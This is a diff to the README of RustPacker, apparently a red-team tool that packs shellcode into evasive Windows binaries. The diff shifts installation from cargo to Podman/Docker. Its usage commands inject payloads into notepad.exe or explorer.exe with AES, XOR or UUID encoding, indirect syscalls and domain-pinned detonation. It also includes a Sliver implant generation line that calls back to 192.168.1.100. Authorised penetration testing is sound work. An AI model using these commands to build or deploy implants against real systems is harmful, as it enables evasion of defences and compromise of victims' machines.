@@ -30,44 +30,21 @@ You need **one** of the following container runtimes installed:
 | **Windows** | [Podman Desktop](https://podman-desktop.io/) | [Docker Desktop](https://www.docker.com/products/docker-desktop/) |
 | **macOS** | `brew install podman && podman machine init && podman machine start` | [Docker Desktop](https://www.docker.com/products/docker-desktop/) |
 
-You also need a [Rust toolchain](https://rustup.rs/) to build RustPacker itself.
+### Full Container Mode (Recommended)
 
-### Build RustPacker
+No Rust toolchain needed — everything runs inside the container:
 
 ```bash
+# Clone and build the all-in-one container
 git clone https://github.com/Nariod/RustPacker.git
 cd RustPacker/
-cargo build --release
-```
 
-### Usage
-
-Place your shellcode in the `shared/` folder and run RustPacker:
-
-```bash
-# Linux / macOS
-cargo run -- -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
-
-# Windows (PowerShell)
-cargo run -- -f shared\your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
-```
-
-RustPacker **automatically detects** Podman or Docker and uses a container for cross-compilation. The first run builds the `rustpacker-builder` image (this only happens once). Subsequent runs reuse the cached image and a shared cargo registry volume for fast builds.
-
-The compiled binary is located in `shared/output_<timestamp>/target/x86_64-pc-windows-gnu/release/` with a randomized filename:
-
-```
-[+] Source binary has been renamed to: "shared/output_1234567890/target/x86_64-pc-windows-gnu/release/AbCdEfGh.exe"
-```
-
-### Alternative: Full Container Mode
-
-You can also run RustPacker entirely inside a container — no Rust toolchain needed on the host:
-
-```bash
-# Build the all-in-one container
 podman build -t rustpacker -f Dockerfile
+```
 
+Place your shellcode in the `shared/` folder and run:
+
+```bash
 # Linux / macOS
 podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker \
   -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
@@ -81,21 +58,45 @@ podman run --rm -v %cd%/shared:/usr/src/RustPacker/shared:z rustpacker RustPacke
   -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
 ```
 
+The compiled binary is located in `shared/output_<timestamp>/target/x86_64-pc-windows-gnu/release/` with a randomized filename:
+
+```
+[+] Source binary has been renamed to: "shared/output_1234567890/target/x86_64-pc-windows-gnu/release/AbCdEfGh.exe"
+```
+
 ### Create an Alias for Convenience
 
 **Linux / macOS (bash/zsh):**
 ```bash
-alias rustpacker='cargo run --manifest-path /path/to/RustPacker/Cargo.toml --'
+alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'
 
 rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
 ```
 
 **Windows (PowerShell):**
 ```powershell
-function rustpacker { cargo run --manifest-path C:\path\to\RustPacker\Cargo.toml -- @args }
+function rustpacker { podman run --rm -v "${PWD}/shared:/usr/src/RustPacker/shared:z" rustpacker RustPacker @args }
 
 rustpacker -f shared\payload.raw -i syscrt -e aes -b exe -t explorer.exe
 ```
+
+### Alternative: Native Mode (Rust toolchain required)
+
+If you already have Rust installed, you can run RustPacker directly. It will **automatically detect** Podman or Docker and use a container for cross-compilation:
+
+```bash
+git clone https://github.com/Nariod/RustPacker.git
+cd RustPacker/
+cargo build --release
+
+# Linux / macOS
+cargo run -- -f shared/your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
+
+# Windows (PowerShell)
+cargo run -- -f shared\your_shellcode.raw -i ntcrt -e aes -b exe -t notepad.exe
+```
+
+The first run builds the `rustpacker-builder` image (once only). Subsequent runs reuse the cached image and a shared cargo registry volume for fast builds.
 
 ## 🖥️ Windows Setup Guide
 
@@ -111,18 +112,17 @@ rustpacker -f shared\payload.raw -i syscrt -e aes -b exe -t explorer.exe
 2. Enable WSL 2 backend during installation (recommended)
 3. Verify installation: `docker --version`
 
-### Step 2: Install Rust
-
-1. Download and run [rustup-init.exe](https://rustup.rs/)
-2. Follow the default installation prompts
-3. Restart your terminal, then verify: `cargo --version`
-
-### Step 3: Clone and Build
+### Step 2: Clone the Repository
 
 ```powershell
 git clone https://github.com/Nariod/RustPacker.git
 cd RustPacker
-cargo build --release
+```
+
+### Step 3: Build the Container Image
+
+```powershell
+podman build -t rustpacker -f Dockerfile
 ```
 
 ### Step 4: Generate and Pack Shellcode
@@ -131,11 +131,14 @@ cargo build --release
 # Place your shellcode in the shared folder
 copy C:\path\to\payload.raw shared\
 
-# Pack with AES encryption and remote thread injection
-cargo run -- -f shared\payload.raw -i ntcrt -e aes -b exe -t notepad.exe
-```
+# Pack with AES encryption and remote thread injection (PowerShell)
+podman run --rm -v ${PWD}/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker `
+  -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
 
-On the first run, RustPacker builds the `rustpacker-builder` container image. This takes a few minutes but only happens once. Subsequent runs are fast thanks to the cached image and cargo registry volume.
+# Pack with AES encryption and remote thread injection (cmd.exe)
+podman run --rm -v %cd%/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker ^
+  -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
+```
 
 ### Troubleshooting (Windows)
 
@@ -183,34 +186,36 @@ generate --mtls 192.168.1.100:443 --format shellcode --os windows --evasion
 
 ### Packing Examples
 
+> The examples below use the `rustpacker` alias defined in the Quick Start section. Replace it with the full `podman run ...` command if you haven't set up the alias.
+
 **Basic EXE with AES encryption (remote injection into notepad):**
 ```bash
-cargo run -- -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
+rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
 ```
 
 **DLL with XOR encryption (self-injection via APC):**
 ```bash
-cargo run -- -f shared/payload.raw -i ntapc -e xor -b dll
+rustpacker -f shared/payload.raw -i ntapc -e xor -b dll
 ```
 
 **Using indirect syscalls (remote injection into explorer):**
 ```bash
-cargo run -- -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
+rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
 ```
 
 **UUID encoding (shellcode hidden as UUID strings):**
 ```bash
-cargo run -- -f shared/payload.raw -i ntcrt -e uuid -b exe -t notepad.exe
+rustpacker -f shared/payload.raw -i ntcrt -e uuid -b exe -t notepad.exe
 ```
 
 **With domain pinning (only detonates on MYDOMAIN):**
 ```bash
-cargo run -- -f shared/payload.raw -i winfiber -e aes -b exe -s MYDOMAIN
+rustpacker -f shared/payload.raw -i winfiber -e aes -b exe -s MYDOMAIN
 ```
 
 **Custom output path:**
 ```bash
-cargo run -- -f shared/payload.raw -i ntcrt -e aes -b exe -o shared/my_binary.exe
+rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -o shared/my_binary.exe
 ```
 
 ## 🛠️ Available Templates
